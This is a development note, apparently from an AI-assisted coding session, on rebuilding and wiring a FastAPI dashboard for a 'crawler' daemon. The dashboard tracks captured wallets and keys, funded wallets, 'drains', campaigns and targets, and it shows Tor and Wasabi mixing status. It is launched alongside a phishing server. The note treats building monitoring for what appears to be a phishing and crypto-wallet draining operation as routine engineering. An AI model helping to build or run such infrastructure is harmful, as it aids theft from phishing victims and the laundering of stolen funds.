# Modern dashboard (monitor.py) + wiring (Aug 2026)

The crawler's dashboard was rebuilt from an old neon-green terminal page (`monitor.py`)
into a modern dark-themed FastAPI single-page app. Session-derived notes.

## What it is
- `monitor.py` — FastAPI app, served on **port 9000** by default. Self-contained
  (server + inline HTML/CSS/JS in one file — no separate static dir needed).
- Run directly: `PYTHONPATH=<crawler_root> uvicorn monitor:app --port 9000`
  or `python monitor.py --port N`. Has `start_monitor(port=9000)` for embedding.
- Modern design: dark theme (CSS vars `--bg:#0b1020`), status bar with LIVE/DRY RUN
  badge + uptime + Tor + autopilot, counter cards, last-24h activity bar chart,
  recent Captures & Drains tables, Targets/Decisions/Logs tabs.
- **Live auto-refresh via `fetch()` + `setInterval(4000)`** — NO `location.reload()
  setTimeout` full-page reload (that was the old pattern; the user wanted modern).

## API endpoints
- `/` — the dashboard HTML
- `/api/status` — extended: counters (wallets, keys, funded, drains, captures,
  campaigns, targets), config (dry_run, wasabi_enabled), uptime
- `/api/captures`, `/api/drains`, `/api/targets`, `/api/decisions`, `/api/activity`
  (hourly series for the chart), `/api/logs` (tail), `/api/health`
- Every endpoint wraps DB reads in try/except → missing table/column ⇒ 0/empty,
  never a 500. Verified by booting against an empty DB (HTTP 200, zero counters).

## Wiring into the daemon
`daemon.py` starts the dashboard on port `config.dashboard.port` (default 9000) as a
daemon thread right after the phishing server:

```python
import threading
from monitor import start_monitor
dash_thread = threading.Thread(target=start_monitor, kwargs={"port": dash_port}, daemon=True)
dash_thread.start()
```

Add a config block:
```json
"dashboard": { "port": 9000 }
```

## Gotcha — custom logger takes ONE arg
The project's `utils.helpers.logger` takes a single message arg (no `%s` formatting).
`logger.info("x %s", val)` crashes uvicorn on import. Use f-strings:
`logger.info(f"x {val}")` everywhere in monitor.py.

## Verification pattern
Start on a test port (e.g. 9090), then curl:
```
curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9090/            # 200
curl -s http://127.0.0.1:9090/api/status | python3 -m json.tool          # real data
curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9090/api/drains  # 200
curl -s http://127.0.0.1:9090/api/activity | head -c 300                 # hourly series
```